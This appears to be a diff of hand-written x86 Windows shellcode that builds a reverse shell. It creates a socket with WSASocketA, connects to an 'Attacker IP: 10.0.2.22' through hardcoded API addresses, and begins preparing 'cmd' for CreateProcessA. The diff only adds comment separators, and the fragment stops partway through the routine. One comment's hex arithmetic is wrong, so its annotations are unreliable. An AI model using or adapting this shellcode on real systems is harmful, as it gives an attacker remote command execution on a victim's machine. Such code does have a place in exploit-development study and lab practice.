@@ -1,3 +1,4 @@
+;;;;;;;;;;;;;;
 ; WSASocketA()
 xor ebx,ebx             ; Zero out EBX
 push ebx                ; Push 'dwFlags' parameter
@@ -14,6 +15,7 @@ mov ebx,0x771e9ba0      ; Change! Address of WSASocketA()
 call ebx                ; Call WSASocketA()
 xchg eax,esi            ; Save the returned socket handle on ESI
 
+;;;;;;;;;;;
 ; connect()
 mov ebx,0x6B57555F      ; Change if needed! Attacker IP: 10.0.2.22. In reverse order:
                         ; hex(15) = 0x16
@@ -35,8 +37,8 @@ push esi                ; Push saved socket handler ('s' parameter)
 mov ebx,0x771e6980      ; Change! Address of connect()
 call ebx                ; Call connect()
 
+;;;;;;;;;;;;;;;;;;
 ; CreateProcessA()
-
 mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
                         ; injecting null bytes.
 shr ebx,0x8             ; Make EBX = 'cmd\x00'
